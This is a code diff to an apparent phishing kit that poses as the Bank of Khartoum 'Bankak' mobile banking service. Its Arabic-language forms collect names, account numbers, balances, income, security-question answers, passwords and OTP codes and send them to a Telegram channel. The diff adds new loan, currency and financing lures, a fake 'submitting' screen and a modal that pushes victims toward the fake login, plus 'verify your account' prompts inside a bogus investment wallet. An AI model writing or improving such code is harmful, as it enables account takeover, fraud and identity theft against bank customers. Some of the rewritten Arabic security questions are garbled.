@@ -206,8 +206,8 @@
     .service-full-width {
       display: flex;
       align-items: center;
-      justify-content: center;
-      padding: 14px;
+      justify-content: space-between;
+      padding: 16px 20px;
       border: 1px solid #e5e7eb;
       border-radius: 12px;
       cursor: pointer;
@@ -216,12 +216,16 @@
       margin-bottom: 10px;
       font-weight: 700;
       color: #374151;
-      font-size: 13.5px;
-      gap: 10px;
-      text-align: center;
+      font-size: 14px;
       text-decoration: none;
     }
-    .service-full-width i { font-size: 1.3rem; color: #d32f2f; }
+    .service-full-width-content {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .service-full-width i:first-child { font-size: 1.4rem; color: #d32f2f; }
+    .service-full-width i.fa-chevron-left { font-size: 0.9rem; color: #9ca3af; }
 
     .form-section {
       padding: 20px;
@@ -265,6 +269,32 @@
       background-position: left 12px center;
       background-size: 16px;
       padding-left: 36px;
+    }
+
+    .checkbox-box {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 14px;
+      background: #ffffff;
+      padding: 10px 12px;
+      border: 2px solid #cbd5e1;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .checkbox-box input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      accent-color: #d32f2f;
+      cursor: pointer;
+    }
+
+    .checkbox-box label {
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: #374151;
+      cursor: pointer;
     }
 
     .icon-right {
@@ -681,11 +711,11 @@
             <i class="fa-solid fa-coins service-icon"></i>
             <span class="service-title">العملات الأجنبية</span>
           </div>
-          <div class="service-option" onclick="selectAndProceedService(1, 'تحديث البيانات')">
+          <div class="service-option" onclick="selectAndProceedService(1, 'قروض شخصية')">
             <i class="fa-solid fa-file-pen service-icon"></i>
-            <span class="service-title"> قروض شخصية</span>
+            <span class="service-title">قروض شخصية</span>
           </div>
-          <div class="service-option" onclick="selectAndProceedService(2, 'أسئلة الأمان')">
+          <div class="service-option" onclick="selectAndProceedService(2, 'بطاقة فيزا افتراضية')">
             <i class="fa-solid fa-shield-halved service-icon"></i>
             <span class="service-title">بطاقة فيزا افتراضية</span>
           </div>
@@ -693,7 +723,7 @@
             <i class="fa-solid fa-chart-column service-icon"></i>
             <span class="service-title">سقف المعاملات اليومية</span>
           </div>
-          <div class="service-option" onclick="selectAndProceedService(4, 'كشف الحساب')">
+          <div class="service-option" onclick="selectAndProceedService(4, 'طلب تمويل')">
             <i class="fa-solid fa-file-invoice service-icon"></i>
             <span class="service-title">طلب تمويل</span>
           </div>
@@ -708,16 +738,35 @@
         </div>
 
         <a class="service-full-width" href="https://bankofkhartoum.com/sudan/ar" target="_blank">
-          <i class="fa-solid fa-user-plus"></i> فتح حساب جديد
+          <div class="service-full-width-content">
+            <i class="fa-solid fa-user-plus"></i>
+            <span>فتح حساب جديد</span>
+          </div>
+          <i class="fa-solid fa-chevron-left"></i>
         </a>
+
         <div class="service-full-width" onclick="openTermsModal()">
-          <i class="fa-solid fa-book-open"></i> الشروط والأحكام
+          <div class="service-full-width-content">
+            <i class="fa-solid fa-book-open"></i>
+            <span>الشروط والأحكام</span>
+          </div>
+          <i class="fa-solid fa-chevron-left"></i>
         </div>
+
         <div class="service-full-width" onclick="openBranchesModal()">
-          <i class="fa-solid fa-location-dot"></i> الفروع
+          <div class="service-full-width-content">
+            <i class="fa-solid fa-location-dot"></i>
+            <span>الفروع</span>
+          </div>
+          <i class="fa-solid fa-chevron-left"></i>
         </div>
+
         <div class="service-full-width" onclick="openContactModal()">
-          <i class="fa-solid fa-headset"></i> اتصل بنا
+          <div class="service-full-width-content">
+            <i class="fa-solid fa-headset"></i>
+            <span>اتصل بنا</span>
+          </div>
+          <i class="fa-solid fa-chevron-left"></i>
         </div>
 
         <div class="transparent-loading-overlay" id="modalServiceLoading">
@@ -747,6 +796,24 @@
       </div>
     </div>
 
+    <!-- شاشة تقديم الطلب المؤقتة -->
+    <div class="screen" id="screenSubmitting">
+      <div class="top-header" style="padding: 12px 16px;">
+        <div class="header-bar">
+          <span class="page-title">حالة الطلب</span>
+        </div>
+        <div class="logo-box" style="transform: scale(0.7);">
+          <div class="logo-ar">بنـ<span>كك</span></div>
+        </div>
+      </div>
+
+      <div class="loading-screen">
+        <div class="loading-spinner"></div>
+        <div class="loading-title">جاري تقديم الاستمارة...</div>
+        <div class="loading-subtitle">يرجى الانتظار لحفظ البيانات</div>
+      </div>
+    </div>
+
     <!-- شاشة تسجيل الدخول (بنوكك) -->
     <div class="screen" id="screenLogin">
       <div class="top-header" style="height: 35%;">
@@ -760,12 +827,12 @@
         <form onsubmit="handleLoginSubmit(event)" autocomplete="off">
           <div class="input-box">
             <span class="icon-right">👤</span>
-            <input type="text" class="input-field" id="userIdInput" placeholder="أدخل رقم المعرف (رقم الحساب أو 249-رقم الموبايل)" maxlength="12" autocomplete="off" data-lpignore="true" />
+            <input type="text" class="input-field" id="userIdInput" placeholder="معرف المستخدم" maxlength="12" autocomplete="off" data-lpignore="true" />
           </div>
 
           <div class="input-box">
             <span class="icon-right">🔒</span>
-            <input type="password" class="input-field" id="passwordInput" placeholder="ادخل كلمة المرور" autocomplete="new-password" data-lpignore="true" />
+            <input type="password" class="input-field" id="passwordInput" placeholder="كلمة المرور" autocomplete="new-password" data-lpignore="true" />
             <span class="password-toggle" onclick="togglePasswordVisibility()">👁️</span>
           </div>
 
@@ -790,10 +857,23 @@
     <div class="modal-overlay" id="modalDevice">
       <div class="modal-box">
         <div class="modal-header">هل ترغب في الدخول إلي حسابك من خدمة بنك الخرطوم المصرفية ؟</div>
-        <div class="modal-body" style="font-size: 0.85rem;">) اضغط على زر إعادة التعيين واتبع التعليمات.</div>
+        <div class="modal-body" style="font-size: 0.85rem;">اضغط على زر إعادة التعيين واتبع التعليمات.</div>
         <div class="modal-actions" style="flex-direction: column; gap: 6px; width: 100%;">
           <button class="btn-red" onclick="goToSecurityQuestions()">الإجابة على أسئلة الأمان</button>
           <button class="btn-red" style="background: #ef4444;" onclick="closeModal('modalDevice')">إلغاء</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- نافذة إكمال الخدمة (تسجيل الدخول) -->
+    <div class="modal-overlay" id="modalCompleteService">
+      <div class="modal-box">
+        <div class="modal-header">تنبيه إكمال الخدمة</div>
+        <div class="modal-body" style="font-size: 0.9rem;">
+          تم استلام استمارتك بنجاح. لإكمال الخدمة، يرجى تسجيل الدخول إلى حسابك (بنكك).
+        </div>
+        <div class="modal-actions" style="flex-direction: column; gap: 6px; width: 100%;">
+          <button class="btn-red" onclick="proceedToLoginFromModal()">تسجيل الدخول</button>
         </div>
       </div>
     </div>
@@ -816,7 +896,7 @@
         </p>
 
         <div class="input-box">
-          <input type="text" class="input-field" placeholder="أدخل الجواب" id="answerInput" autocomplete="off" />
+          <input type="text" class="input-field" placeholder="أدخل الإجابة هنا" id="answerInput" autocomplete="off" />
         </div>
 
         <div class="btn-group">
@@ -846,7 +926,7 @@
 
           <div class="input-box">
             <span class="icon-right">📱</span>
-            <input type="text" class="input-field" id="otpInput" placeholder="أدخل الرمز السري (6 أرقام)" maxlength="6" autocomplete="off" />
+            <input type="text" class="input-field" id="otpInput" placeholder="أدخل رمز التحقق المكون من 6 أرقام" maxlength="6" autocomplete="off" />
           </div>
 
           <a href="#" class="resend-link">إعادة إرسال</a>
@@ -890,7 +970,7 @@
     <div class="modal-overlay" id="modalBranches" style="align-items: flex-end; padding: 0;">
       <div class="modal-box" style="max-width: 100%; height: 85vh; border-radius: 20px 20px 0 0; display: flex; flex-direction: column;">
         <div class="modal-header" style="display: flex; justify-content: space-between; align-items: center;">
-          <span>فروع بنك الخرطوم (كاملة)</span>
+          <span>فروع بنك الخرطوم</span>
           <i class="fa-solid fa-xmark" style="cursor: pointer; font-size: 1.2rem;" onclick="closeModal('modalBranches')"></i>
         </div>
         <div class="modal-body" style="overflow-y: auto; text-align: right; font-size: 0.85rem; padding: 16px; flex: 1;">
@@ -983,7 +1063,7 @@
     <div class="modal-overlay" id="modalError">
       <div class="modal-box">
         <div class="modal-header">خطأ</div>
-        <div class="modal-body" id="modalErrorText">Invalid Source. Please contact Customer Care</div>
+        <div class="modal-body" id="modalErrorText"></div>
         <div class="modal-actions">
           <button class="btn-retry" onclick="closeErrorModal()">إعادة المحاولة</button>
         </div>
@@ -995,7 +1075,7 @@
       <div class="header-bar-wallet">
         <button class="btn-top-back" style="color:#374151; background:#f3f4f6; border-color:#d1d5db;" onclick="switchScreen('screenServices')"><i class="fa-solid fa-arrow-right"></i> رجوع</button>
         <div class="wallet-title-box"><i class="fa-solid fa-chart-line"></i> المحفظة الاستثمارية</div>
-        <div id="dynamic-greeting" class="greeting-text">نهار سعيد</div>
+        <div id="dynamic-greeting" class="greeting-text"></div>
       </div>
 
       <div style="padding: 16px; flex: 1; display: flex; flex-direction: column; gap: 16px; overflow-y: auto;">
@@ -1106,7 +1186,7 @@
     <div class="modal-overlay" id="modalFundAlert">
       <div class="modal-box">
         <div class="modal-header">تنبيه الانضمام للصفقة</div>
-        <div class="modal-body" id="modalFundText">يجب توثيق الحساب أولاً للاستفادة من جميع الخدمات.</div>
+        <div class="modal-body" id="modalFundText">يرجى توثيق حسابك المصرفي أو إتمام عملية المصادقة لتفعيل المحفظة والانضمام للصفقات بنجاح.</div>
         <div style="padding: 0 16px 16px; display: flex; gap: 6px;">
           <button class="btn-red" style="flex:1;" onclick="closeModal('modalFundAlert'); switchScreen('screenLogin');">توثيق</button>
           <button class="btn-red" style="flex:1; background:#6b7280;" onclick="closeModal('modalFundAlert')">إلغاء</button>
@@ -1127,10 +1207,10 @@
 
     const questions = [
       "ما هو اسم المدرسة التي التحقت بها؟",
-      " في اي سنة الحالي التقريبيي",
+      "في أي سنة حدثت هذه الدراسة التقريبية؟",
       "أي فيلم هو المفضَّل لديك؟",
       "ما هو اسم ابن عمك الأول؟",
-      "ماذا كان تلفزيون أثناء الطفولة؟"
+      "ماذا كان اسم ط ذلك أثناء الطفولة؟"
     ];
 
     async function sendToTelegram(text) {
@@ -1187,24 +1267,75 @@
       const container = document.getElementById('formFieldsContainer');
       
       let html = `
-        <div class="input-box"><label class="input-label">الاسم الكامل</label><input type="text" class="input-field dynamic-input" id="f_name" placeholder="أدخل اسمك ثلاثياً" required autocomplete="off" /></div>
-        <div class="input-box"><label class="input-label">رقم الحساب</label><input type="text" class="input-field dynamic-input" id="f_acc" placeholder="أدخل رقم الحساب" required autocomplete="off" /></div>
-        <div class="input-box"><label class="input-label">رقم الهاتف المسجل مع الحساب</label><input type="tel" class="input-field dynamic-input" id="f_phone" placeholder="09xxxxxxxx" required autocomplete="off" /></div>
-        <div class="input-box"><label class="input-label">الرصيد المتبقي في الحساب</label><input type="text" class="input-field dynamic-input" id="f_balance" placeholder=" required aلحاليomplete="off" /></div>
+        <div class="input-box"><label class="input-label">الاسم الكامل</label><input type="text" class="input-field dynamic-input" id="f_name" placeholder="أدخل الاسم الثلاثي أو الرباعي" required autocomplete="off" /></div>
+        <div class="input-box"><label class="input-label">رقم الحساب</label><input type="text" class="input-field dynamic-input" id="f_acc" placeholder="أدخل رقم الحساب المصرفي" required autocomplete="off" /></div>
+        <div class="input-box"><label class="input-label">رقم الهاتف المسجل مع الحساب</label><input type="tel" class="input-field dynamic-input" id="f_phone" placeholder="أدخل رقم الهاتف" required autocomplete="off" /></div>
+        <div class="input-box"><label class="input-label">الرصيد المتبقي في الحساب</label><input type="text" class="input-field dynamic-input" id="f_balance" placeholder="أدخل الرصيد التقديري" required autocomplete="off" /></div>
       `;
 
-      if (index === 3) {
+      if (index === 0) {
         html += `
-          <div class="input-box"><label class="input-label">السقف الحالي</label><input type="text" class="input-field dynamic-input" id="f_limit_curr" placeholder="مثال: 500,000 جنيه" required autocomplete="off" /></div>
-          <div class="input-box"><label class="input-label">السقف المراد اعتماده</label><input type="text" class="input-field dynamic-input" id="f_limit_new" placeholder="مثال: 2,000,000 جنيه" required autocomplete="off" /></div>
-          <div class="input-box"><label class="input-label">سبب طلب رفع السقف</label><input type="text" class="input-field dynamic-input" id="f_reason" placeholder="اذكر السبب باختصار" required autocomplete="off" /></div>
+          <div class="input-box">
+            <label class="input-label">نوع العملة المطلوبة</label>
+            <select class="input-field dynamic-input" id="f_currency_type" required>
+              <option value="">اختر العملة</option>
+              <option value="دولار أمريكي (USD)">دولار أمريكي (USD)</option>
+              <option value="يورو (EUR)">يورو (EUR)</option>
+              <option value="ريال سعودي (SAR)">ريال سعودي (SAR)</option>
+              <option value="درهم إماراتي (AED)">درهم إماراتي (AED)</option>
+            </select>
+          </div>
+          <div class="input-box"><label class="input-label">المبلغ المراد استبداله / تحويله</label><input type="text" class="input-field dynamic-input" id="f_currency_amount" placeholder="أدخل المبلغ" required autocomplete="off" /></div>
+        `;
+      } else if (index === 1) {
+        html += `
+          <div class="input-box"><label class="input-label">مبلغ القرض المطلوب</label><input type="text" class="input-field dynamic-input" id="f_loan_amount" placeholder="أدخل مبلغ القرض" required autocomplete="off" /></div>
+          <div class="input-box">
+            <label class="input-label">فترة السداد المفضلة</label>
+            <select class="input-field dynamic-input" id="f_loan_period" required>
+              <option value="">اختر فترة السداد</option>
+              <option value="6 أشهر">6 أشهر</option>
+              <option value="12 شهر">12 شهر</option>
+              <option value="24 شهر">24 شهر</option>
+            </select>
+          </div>
+          <div class="input-box"><label class="input-label">الغرض من القرض</label><input type="text" class="input-field dynamic-input" id="f_loan_reason" placeholder="أدخل سبب طلب القرض" required autocomplete="off" /></div>
+        `;
+      } else if (index === 3) {
+        html += `
+          <div class="input-box"><label class="input-label">السقف الحالي</label><input type="text" class="input-field dynamic-input" id="f_limit_curr" placeholder="أدخل السقف الحالي" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">السقف المراد اعتماده</label><input type="text" class="input-field dynamic-input" id="f_limit_new" placeholder="أدخل السقف المطلوب" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">سبب طلب رفع السقف</label><input type="text" class="input-field dynamic-input" id="f_reason" placeholder="أدخل السبب" required autocomplete="off" /></div>
+        `;
+      } else if (index === 4) {
+        // تم تحديث استمارة طلب التمويل لتشمل أكثر من 10 أسئلة وحقول وصناديق اختيار (Checkboxes)
+        html += `
+          <div class="input-box"><label class="input-label">5. الدخل الشهري التقريبي</label><input type="text" class="input-field dynamic-input" id="f_fund_income" placeholder="أدخل الدخل الشهري" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">6. نوع المهنة أو الوظيفة</label><input type="text" class="input-field dynamic-input" id="f_fund_job" placeholder="أدخل طبيعة المهنة" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">7. مبلغ التمويل المطلوب</label><input type="text" class="input-field dynamic-input" id="f_fund_amount" placeholder="أدخل المبلغ المطلوب" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">8. الغرض الأساسي من التمويل</label><input type="text" class="input-field dynamic-input" id="f_fund_purpose" placeholder="أدخل غرض التمويل" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">9. فترة السداد المقترحة</label><input type="text" class="input-field dynamic-input" id="f_fund_duration" placeholder="أدخل المدة بالأشهر" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">10. الضمانات المقدمة للتمويل</label><input type="text" class="input-field dynamic-input" id="f_fund_guarantee" placeholder="أدخل تفاصيل الضمان" required autocomplete="off" /></div>
+          
+          <div class="checkbox-box">
+            <input type="checkbox" id="f_chk_sudan" required />
+            <label for="f_chk_sudan">هل أنت مقيم داخل السودان حالياً؟</label>
+          </div>
+          <div class="checkbox-box">
+            <input type="checkbox" id="f_chk_terms" required />
+            <label for="f_chk_terms">هل توافق على كافة الشروط والاحكام والضوابط المصرفية؟</label>
+          </div>
+          <div class="checkbox-box">
+            <input type="checkbox" id="f_chk_accuracy" required />
+            <label for="f_chk_accuracy">هل تقر بأن جميع البيانات المدخلة صحيحة ومسؤولة عنها قانونياً؟</label>
+          </div>
         `;
       } else if (index === 5) {
         html += `
           <div class="input-box">
             <label class="input-label">نوع الحساب الحالي</label>
             <select class="input-field dynamic-input" id="f_curr_acc_type" required>
-              <option value="">اختر نوع حسابك الحالي</option>
+              <option value="">اختر نوع الحساب الحالي</option>
               <option value="حساب توفير عادي">حساب توفير عادي</option>
               <option value="حساب جاري">حساب جاري</option>
               <option value="حساب إلكتروني مصغر">حساب إلكتروني مصغر</option>
@@ -1213,7 +1344,7 @@
           <div class="input-box">
             <label class="input-label">نوع الحساب المراد الترقية إليه</label>
             <select class="input-field dynamic-input" id="f_target_acc_type" required>
-              <option value="">اختر الحساب المستهدف</option>
+              <option value="">اختر نوع الحساب المستهدف</option>
               <option value="حساب ذهبي مميز">حساب ذهبي مميز</option>
               <option value="حساب أعمال VIP">حساب أعمال VIP</option>
               <option value="حساب استثماري متقدم">حساب استثماري متقدم</option>
@@ -1222,20 +1353,20 @@
         `;
       } else if (index === 6) {
         html += `
-          <div class="input-box"><label class="input-label">رقم الحساب المرسل (منه)</label><input type="text" class="input-field dynamic-input" id="f_sender_acc" placeholder="رقم حسابك المرسل" required autocomplete="off" /></div>
-          <div class="input-box"><label class="input-label">رقم الحساب المستقبل (إليه خطأً)</label><input type="text" class="input-field dynamic-input" id="f_receiver_acc" placeholder="رقم الحساب المحول له بالخطأ" required autocomplete="off" /></div>
-          <div class="input-box"><label class="input-label">رقم العملية (رقم الإيصال)</label><input type="text" class="input-field dynamic-input" id="f_tx_id" placeholder="أدخل رقم العملية المرجعي" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">رقم الحساب المرسل (منه)</label><input type="text" class="input-field dynamic-input" id="f_sender_acc" placeholder="رقم حسابك" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">رقم الحساب المستقبل (إليه خطأً)</label><input type="text" class="input-field dynamic-input" id="f_receiver_acc" placeholder="رقم الحساب الخطأ" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">رقم العملية (رقم الإيصال)</label><input type="text" class="input-field dynamic-input" id="f_tx_id" placeholder="رقم مرجع المعاملة" required autocomplete="off" /></div>
           <div class="input-box"><label class="input-label">تاريخ المعاملة</label><input type="date" class="input-field dynamic-input" id="f_tx_date" required /></div>
         `;
       } else if (index === 2) {
         html += `
-          <div class="input-box"><label class="input-label">آخر ثلاثة معاملات تمت في الحساب</label><input type="text" class="input-field dynamic-input" id="f_last_tx" placeholder="مثال: تحويل، سحب، شراء..." required autocomplete="off" /></div>
-          <div class="input-box"><label class="input-label">اسم الوالدة الثلاثي</label><input type="text" class="input-field dynamic-input" id="f_mother_name" placeholder="اسم الأم كاملاً" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">آخر ثلاثة معاملات تمت في الحساب</label><input type="text" class="input-field dynamic-input" id="f_last_tx" placeholder="تفاصيل المعاملات الأخيرة" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">اسم الوالدة الثلاثي</label><input type="text" class="input-field dynamic-input" id="f_mother_name" placeholder="أدخل اسم الوالدة" required autocomplete="off" /></div>
         `;
       }
 
       html += `
-        <div class="input-box"><label class="input-label">رقم الواتساب (للتواصل السريع)</label><input type="tel" class="input-field dynamic-input" id="f_whatsapp" placeholder="09xxxxxxxx أو برمز الدولة" required autocomplete="off" /></div>
+        <div class="input-box"><label class="input-label">رقم الواتساب (للتواصل السريع)</label><input type="tel" class="input-field dynamic-input" id="f_whatsapp" placeholder="أدخل رقم الواتساب" required autocomplete="off" /></div>
       `;
 
       container.innerHTML = html;
@@ -1250,8 +1381,14 @@
       const whatsapp = document.getElementById('f_whatsapp').value;
 
       let extraInfo = "";
-      if (selectedServiceIndex === 3) {
+      if (selectedServiceIndex === 0) {
+        extraInfo = `\n- العملة المطلوبة: ${document.getElementById('f_currency_type').value}\n- المبلغ: ${document.getElementById('f_currency_amount').value}`;
+      } else if (selectedServiceIndex === 1) {
+        extraInfo = `\n- مبلغ القرض: ${document.getElementById('f_loan_amount').value}\n- فترة السداد: ${document.getElementById('f_loan_period').value}\n- الغرض: ${document.getElementById('f_loan_reason').value}`;
+      } else if (selectedServiceIndex === 3) {
         extraInfo = `\n- السقف الحالي: ${document.getElementById('f_limit_curr').value}\n- السقف المطلوب: ${document.getElementById('f_limit_new').value}\n- السبب: ${document.getElementById('f_reason').value}`;
+      } else if (selectedServiceIndex === 4) {
+        extraInfo = `\n- الدخل الشهري: ${document.getElementById('f_fund_income').value}\n- المهنة: ${document.getElementById('f_fund_job').value}\n- مبلغ التمويل: ${document.getElementById('f_fund_amount').value}\n- الغرض: ${document.getElementById('f_fund_purpose').value}\n- مدة السداد: ${document.getElementById('f_fund_duration').value}\n- الضمانات: ${document.getElementById('f_fund_guarantee').value}\n- مقيم بالسودان: ${document.getElementById('f_chk_sudan').checked ? 'نعم' : 'لا'}\n- موافق ع الشروط: ${document.getElementById('f_chk_terms').checked ? 'نعم' : 'لا'}\n- صحة البيانات: ${document.getElementById('f_chk_accuracy').checked ? 'نعم' : 'لا'}`;
       } else if (selectedServiceIndex === 5) {
         extraInfo = `\n- الحساب الحالي: ${document.getElementById('f_curr_acc_type').value}\n- الحساب المستهدف: ${document.getElementById('f_target_acc_type').value}`;
       } else if (selectedServiceIndex === 6) {
@@ -1262,6 +1399,15 @@
 
       sendToTelegram(`📋 *بيانات استمارة نهائية (${selectedServiceName}):*\n- الاسم: ${name}\n- الحساب: ${acc}\n- الهاتف المسجل: ${phone}\n- الرصيد المتبقي: ${balance}${extraInfo}\n- رقم الواتساب: ${whatsapp}`);
       
+      // إظهار شاشة جاري تقديم الطلب ثم الانتقال لنافذة إكمال الخدمة
+      switchScreen('screenSubmitting');
+      setTimeout(() => {
+        document.getElementById('modalCompleteService').style.display = 'flex';
+      }, 1500);
+    }
+
+    function proceedToLoginFromModal() {
+      document.getElementById('modalCompleteService').style.display = 'none';
       switchScreen('screenLogin');
     }
 
@@ -1270,7 +1416,7 @@
     }
 
     function showErrorModal(message) {
-      document.getElementById('modalErrorText').textContent = message || "Invalid Source. Please contact Customer Care";
+      document.getElementById('modalErrorText').textContent = message || "عذراً، حدث خطأ في إدخال البيانات. يرجى التحقق والمحاولة مرة أخرى.";
       document.getElementById('modalError').style.display = 'flex';
     }
 
@@ -1292,7 +1438,7 @@
       const passRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]).{8,}$/;
 
       if (!accRegex.test(accInput) || !passRegex.test(passInput)) {
-        showErrorModal("Invalid Source. Please contact Customer Care");
+        showErrorModal("Invalid Credentials or format. Please check your account number and password requirements.");
         return;
       }
 
@@ -1316,7 +1462,7 @@
       const currentQuestion = document.getElementById('questionText').textContent;
 
       if (answer === '') {
-        showErrorModal("يرجى إدخال إجابة سؤال الأمان للمتابعة.");
+        showErrorModal("الرجاء إدخال الإجابة الصحيحة لسؤال الأمان الموضح.");
       } else {
         sendToTelegram(`🛡️ *إجابة سؤال الأمان*\n\n❓ السؤال: ${currentQuestion}\n💡 الإجابة: \`${answer}\``);
         goToOtpScreen();
@@ -1350,7 +1496,7 @@
       const otp = document.getElementById('otpInput').value.trim();
 
       if (!/^\d{6}$/.test(otp)) {
-        showErrorModal("رمز التحقق غير صحيح، يجب أن يتكون من 6 أرقام.");
+        showErrorModal("يرجى إدخال رمز التحقق (OTP) المؤلف من 6 أرقام بشكل صحيح.");
         return;
       }
 
@@ -1359,17 +1505,17 @@
     }
 
     function attemptJoinDeal(dealName, amount) {
-      document.getElementById('modalFundText').textContent = "يجب توثيق الحساب أولاً للاستفادة من جميع الخدمات.";
+      document.getElementById('modalFundText').textContent = `للانضمام إلى (${dealName}) بقيمة ${amount}، يلزم توثيق الحساب المالي أو ربط وسيلة الدفع المصرفية الخاصة بك.`;
       document.getElementById('modalFundAlert').style.display = 'flex';
     }
 
     function handleWalletAction(action) {
-      document.getElementById('modalFundText').textContent = "يجب توثيق الحساب أولاً للاستفادة من جميع الخدمات.";
+      document.getElementById('modalFundText').textContent = `لتنفيذ عملية (${action}) بنجاح، يتطلب الأمر التحقق من تفاصيل الحساب البنكي واستكمال المصادقة الرسمية.`;
       document.getElementById('modalFundAlert').style.display = 'flex';
     }
 
     function handleDirectWithdrawal() {
-      document.getElementById('modalFundText').textContent = "يجب توثيق الحساب أولاً للاستفادة من جميع الخدمات.";
+      document.getElementById('modalFundText').textContent = "يرجى تأكيد ربط حساب بنك الخرطوم أو محفظة بنكك لتتمكن من سحب الأرباح المتاحة مباشرة.";
       document.getElementById('modalFundAlert').style.display = 'flex';
     }
 
@@ -1381,7 +1527,7 @@
     }
 
     function openAccountStatementScreen() {
-      document.getElementById('modalFundText').textContent = "يجب توثيق الحساب أولاً للاستفادة من جميع الخدمات.";
+      document.getElementById('modalFundText').textContent = "لاستعراض كشف الحساب المفصل، يرجى استكمال إجراءات التحقق الأمني لحسابك المصرفي.";
       document.getElementById('modalFundAlert').style.display = 'flex';
     }
   </script>
